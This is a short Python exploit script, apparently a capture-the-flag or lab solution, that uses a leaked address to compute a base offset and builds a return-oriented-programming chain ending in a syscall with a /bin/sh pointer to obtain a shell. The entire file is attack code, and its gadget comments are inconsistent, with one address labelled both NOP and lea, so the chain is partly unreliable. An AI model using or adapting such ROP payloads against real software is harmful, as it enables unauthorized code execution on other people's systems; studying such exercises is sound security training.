from struct import pack


def get_id(addr1, addr2):
    return '16'


def get_password(addr1, addr2):
    offset = addr1 - 0x2de0 # vuln_leak@@Base addr - vuln_leak@@Base fixed addr
    p = bytes()
    p += pack('<Q', offset+0x2f80)  # mov rax, 57 ; ret
    p += pack('<Q', offset+0x2f70)  # NOP
    p += pack('<Q', offset+0x2f70)  # lea rax, [rdi + 1] ; ret
    p += pack('<Q', offset+0x2f70)  # NOP
    p += pack('<Q', offset+0x2f70)  # lea rax, [rdi + 1] ; ret
    p += pack('<Q', offset+0x2f78)  # mov rax, cs:binsh

    # mov rax, rdi ; mov rdi, rsi ; xor rsi, rsi ; xor rdx, rdx ; syscall
    p += pack('<Q', offset+0x2f88)

    return p